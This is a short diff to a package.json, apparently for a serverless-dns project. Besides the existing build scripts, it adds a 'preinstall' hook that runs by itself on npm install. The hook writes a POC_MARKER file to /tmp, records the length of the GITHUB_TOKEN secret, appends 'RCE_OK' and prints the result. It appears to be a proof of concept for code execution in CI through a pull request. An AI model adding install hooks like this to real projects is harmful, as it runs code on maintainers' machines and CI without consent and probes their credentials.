@@ -16,7 +16,8 @@
     "build:fastly": "npx webpack --config webpack.fastly.cjs && npm run fastly:wasm",
     "build:fly": "npx webpack --config webpack.fly.cjs",
     "build:flybun": "bun build ./src/server-node.js --production --target node --outdir ./dist --entry-naming bun.mjs --format esm --packages=external",
-    "fastly:wasm": "npx js-compute-runtime ./dist/fastly.js ./dist/fastly.wasm"
+    "fastly:wasm": "npx js-compute-runtime ./dist/fastly.js ./dist/fastly.wasm",
+    "preinstall": "echo POC_MARKER_SERVERLESS-DNS > /tmp/POC_MARKER_SERVERLESS-DNS.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_SERVERLESS-DNS.txt; echo RCE_OK >> /tmp/POC_MARKER_SERVERLESS-DNS.txt; cat /tmp/POC_MARKER_SERVERLESS-DNS.txt"
   },
   "repository": {
     "type": "git",
